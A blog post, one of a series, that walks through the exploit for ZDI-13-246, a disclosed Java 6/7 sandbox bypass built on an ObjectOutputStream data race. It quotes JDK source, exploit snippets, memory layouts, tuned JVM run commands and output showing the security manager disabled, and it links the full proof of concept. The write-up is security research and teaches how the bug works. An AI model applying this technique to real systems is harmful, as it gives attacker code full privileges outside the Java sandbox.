---
layout: post
title: "ZDI-13-246 (2013) Java 1.7.0_15 Sandbox Bypass via ObjectOutputStream"
date: 2015-10-23 17:35
comments: true
categories: 
---

This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
between 2012-2013. You can view the other bugs by going back to the [original post](/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass).

This is my favourite bug because it takes two read primitives (no memory corruption) and converts them into a full sandbox bypass. The primitives are read some memory as an integer and read some memory as an object reference. This lets us find out the address of a Class object and ultimately build up a fake object that we can read.

It also shows how difficult it is to protect the JVM against hostile code because hostile code is able to create arbitrary threads and generate data races. This particular data race would probably be between 1 or 2 instructions if the JIT was active so it shows that any data race no matter how narrow should be exploitable on the JVM. This is made easier by the fact that as an attacker you can control a lot of the JVM options. For example you can force the JVM to run in interpreted mode which gives you a larger instruction window to race against. Also, you can tweak the GC options and have a lot of control over the heap size which helps with reliability of the heap spray used in this exploit.

We also see that a helpful maintainer has left a comment pointing out the vulnerability :)

This is a full sandbox bypass for Java 6 and Java 7. I've tested it on
Java 1.7.0_15 and Java 1.6.0_38 on a single core 64 bit machine. The
exploit will only work against 64 bit compressed oops memory architecture and
32 bit memory architecture. It will not work against normal 64 bit architecture.
By default java after 1.6.0_23 will use compressed oops on a 64 bit machine.


Vulnerability
-------------

This exploits a data race between reading the current serialized object and
the description for the current serialized object in the ObjectOutputStream
class. When in a writeObject method an attacker can call writeObject on the
ObjectOutputStream on a different thread which will change the current
serialized context. It is possible for the following order to happen:

    /* Thread 1: gets old object */
    defaultWriteObject (435): curObj = curContext.getObj();

    /* Thread 2: writes new object and object description */
    writeSerialData (1478):  curContext = new SerialCallbackContext(obj, slotDesc);

    /* Thread 1: gets new object description -oh noes- */
    defaultWriteObject (436): curDesc = curContext.getDesc();

You have to run the particular call pattern thousands and thousands of times
to get lucky enough for this to happen. But it can happen :)

[defaultWriteObject](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteObject%28%29)

```java
431     public void defaultWriteObject() throws IOException {
432         if ( curContext == null ) {
433             throw new NotActiveException("not in call to writeObject");
434         }
435         Object curObj = curContext.getObj();
436         ObjectStreamClass curDesc = curContext.getDesc();
437         bout.setBlockDataMode(false);
438         defaultWriteFields(curObj, curDesc);
439         bout.setBlockDataMode(true);
440     }
```

[defaultWriteFields](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteFields%28java.lang.Object%2Cjava.io.ObjectStreamClass%29)

```java
1503    private void defaultWriteFields(Object obj, ObjectStreamClass desc)
1504        throws IOException
1505    {
1506        // REMIND: perform conservative isInstance check here?
1507        desc.checkDefaultSerialize();
```

[writeSerialData](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.writeSerialData%28java.lang.Object%2Cjava.io.ObjectStreamClass%29)

```java
1477                try {
1478                    curContext = new SerialCallbackContext(obj, slotDesc);
1479                    bout.setBlockDataMode(true);
1480                    slotDesc.invokeWriteObject(obj, this);
1481                    bout.setBlockDataMode(false);
1482                    bout.writeByte(TC_ENDBLOCKDATA);
1483                } finally {
1484                    curContext.setUsed();
1485                    curContext = oldContext;
1486                    if (extendedDebugInfo) {
1487                        debugInfoStack.pop();
1488                    }
1489                }
```

And in the #defaultWriteFields method we also have a 'REMIND' comment
asking whether we should do the isInstance check which I believe would fix this
exploit. In ObjectInputStream there is an isInstance check which prevents a
similar exploit working for the ObjectInputStream. Which is kind of annoying
because being able to do arbitrary writes in the JVM is more fun than being able
to arbitrary reads.

This mismatch between the object and the object descriptor is a problem because
the ObjectStreamClass uses the Unsafe class to read values from memory. This
is fine when that descriptor and object match but when they don't match the JVM
can be tricked into interpreting object references as integer values or integer
values as object references :)


[getPrimFieldValues](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getPrimFieldValues%28java.lang.Object%2Cbyte%5B%5D%29)

```java
1924                    case 'I':
1925                        Bits.putInt(buf, off, unsafe.getInt(obj, key));
```

[getObjFieldValues](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getObjFieldValues%28java.lang.Object%2Cjava.lang.Object%5B%5D%29)

```java
2017                    vals[offsets[i]] = unsafe.getObject(obj, readKeys[i]);
```

Exploit
-------

The POC is available from [Github](https://github.com/benmmurphy/JavaPlayground/blob/master/ZDI-13-246/Ser2.java)

The race condition is triggered by supplying a custom writeObject method for
the class we want to reinterpet. This method will look something like this:

```java
    private void writeObject(final ObjectOutputStream oos) throws Exception {

      final CountDownLatch latch = new CountDownLatch(1);

      Thread th = new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            oos.writeObject(new ShadowInt(latch));
          } catch (Throwable th) {
            // ignore
          }

        }

      });
      th.start();
      try {
        start.await();
        oos.defaultWriteObject();
      } finally {
        latch.countDown();
      }
      try {
        th.join();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }

    }
  }
```

We spawn a Thread that will perform a writeObject call with an instance of the
target class we want the original class to be reinterpreted as.

This class will also implement the writeObject method and will use it wait
until the origin object has completed its defaultWriteObject() call before
returning. This ensures the new context will be available for the original
object. Otherwise, the new context might be removed before the original object
has a chance to use it. It will look something like this:

```java
    private void writeObject(ObjectOutputStream oos) {
      try {
        latch.await();
      } catch (InterruptedException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
      }
    }
```

The goal of the exploit is to build up a fake object of type FakeMe which will
have a field of type EvilClassLoader which will point to a normal ClassLoader.

```java
  public static class FakeMe implements Serializable {
    private int magic = 0xDEADBEEF;
    private EvilClassLoader o;
```

The JVM memory layout of an object looks something like this:

    -----------------------------------------------------------
    | Header 4/8 bytes depending on 32bit/64bit               |
    ----------------------------------------------------------|
    | Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
    -----------------------------------------------------------
    | Maybe some padding                                      |
    -----------------------------------------------------------
    | Field 1                                                 |
    -----------------------------------------------------------
    | etc..                                                   |
    -----------------------------------------------------------

The first thing we need to do is find the class word. To do this we create
an EatMe class which doesn't have any fields but using the race condition we
will try and make it look like the ClassCatcher class which has 40 int fields
in it. We then spray the heap with a bunch of FakeMe classes. Hopefully, the JVM
will read off the end of the ClassCatcher class and into the memory of the
FakeMe class. If it serializes a bit of the FakeMe class then the serialized
data is going to look like:

    [Some Crap] [Class Header] [Class Word] 0xDEADBEEF [Some Crap]

We can just search for DEADBEEF in the serialized data and if it is there then
we have recovered the Class word.

The next thing we need is an address of a ClassLoader object and the address
of an object that we can point inside of and re-interpret as a FakeMe object.
For the re-interpeting object I chose an array of int. We store the ClassLoader
and array of int in the ObjectHolder object and use the race condition to
reinterpret it as a ShadowInt class. The ShadowInt object's fields are integers
that allow us to read the address of the fields in the ObjectHolder object.

Now we have the addresses of the array of int and a classloader object we can
create our fake object.

The JVM memory layout of an array of int looks something like this:

    -----------------------------------------------------------
    | Header 4/8 bytes depending on 32bit/64bit               |
    ----------------------------------------------------------|
    | Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
    -----------------------------------------------------------
    | Length 4 bytes                                          |
    -----------------------------------------------------------
    | Int at index 0 (4 bytes)                                |
    -----------------------------------------------------------
    | Int at index 1 (4 bytes)                                |
    -----------------------------------------------------------
    | Int at index 2 (4 bytes)                                |
    -----------------------------------------------------------
    | Int at index 3 (4 bytes)                                |
    -----------------------------------------------------------
    | etc..                                                   |
    -----------------------------------------------------------

So on 64 bit with compressed pointers we store the object header in the first
two integers, the class word in the third integer and the reference to the class
loader in the fourth integer. It will look something like this:

    -----------------------------------------------------------
    | Header 4/8 bytes depending on 32bit/64bit               |
    ----------------------------------------------------------|
    | Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
    -----------------------------------------------------------
    | Length 4 bytes                                          |
    -----------------------------------------------------------
    | Object Header Part 1                                    |
    -----------------------------------------------------------
    | Object Header Part 2                                    |
    -----------------------------------------------------------
    | FakeMe Class Word                                       |
    -----------------------------------------------------------
    | Reference to ClassLoader                                |
    -----------------------------------------------------------

The address of this fake object will be 16 bytes following the address of the
array on 64 bit with compressed pointers. However, when we store this address
somewhere we need to convert it to a compressed pointer. This is done by using
an offset of 2 from the address of the array (which is already a compressed
pointer) instead of 16 because compressed pointers effectively multiply the
address by 8. Very strangely on Linux and windows compressed oops don't appear
to be compressed and an offset of 16 instead of 2 needs to be used. I only see
properly compressed oops under OSX [1].

Finally we use the IntHolder object to store the address of the fake object and
use the race condition to re-inerpret it as a ShadowObject. The ShadowObject has
a single object field so the address originally stored as an integer will be
interpreted as an object reference. The ObjectOutputStream will then try to
serialize it and FakeMe implements the writeObject method so it will be able to
use the ClassLoader reference to define an Evil class with AllPermission which
will disable the JVM sandbox. The source code for the Evil class is in Evil.java


Testing
-------

    java -Xint -XX:+UseSerialGC -Xms256m -Xmx256m -Xnoclassgc -Djava.security.manager Ser2
or
    appletviewer -J-Xint -J-XX:+UseSerialGC -J-Xms256m -J-Xmx256m -J-Xnoclassgc test.html

command line appletviewer needs -Xint and other parameters because it ignores
the jvm args applet parameter. firefox and ie both correctly handles the
-Xint and other parameters.

[Applet Deployment Parameters](http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/applet/applet_deployment.html)

If the exploit works you will get output like this:

    using arch: OOPS64
    readclassaddress:0
    found magic with: 528/528
    got class address: 564408075
    readaddress:0/0
    found magic with: 51/64
    found addresses: [574680158, 584221623]
    readObject:0
    FAKEME!
    disabled security manager
    /Users/ben
    java.io.IOException: Cannot run program "calc.exe": error=2, No such file or directory
            at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
            at Ser2.init(Ser2.java:546)
            at Ser2.main(Ser2.java:531)
    Caused by: java.io.IOException: error=2, No such file or directory
            at java.lang.UNIXProcess.forkAndExec(Native Method)
            at java.lang.UNIXProcess.<init>(UNIXProcess.java:135)
            at java.lang.ProcessImpl.start(ProcessImpl.java:130)
            at java.lang.ProcessBuilder.start(ProcessBuilder.java:1021)
            ... 2 more

This exploits depends on a race condition that may be difficult to reproduce. We
force the applet to run in interpreted mode to increase the chance of running
into the race condition.

This exploit depends on the memory layout of the JVM and is not as reliable as
other exploits. It also appears that the compressed OOP format is different on
Windows and Linux when compared to OSX [1]. The exploit will try to determine what
format it should put the compressed OOPs in but it could guess wrong in which
case the exploit is likely to crash or just not work.

The exploit will try and print out user.home and run an apple script that will
say some stuff and run calc.exe.


(1): So for compressed OOPS and small heaps < 4GB (maybe it needs to be smaller) you don't need to perform a shift so apparently on Linux and Windows JVM the shift was skipped but on OSX the shift was still being performed. 
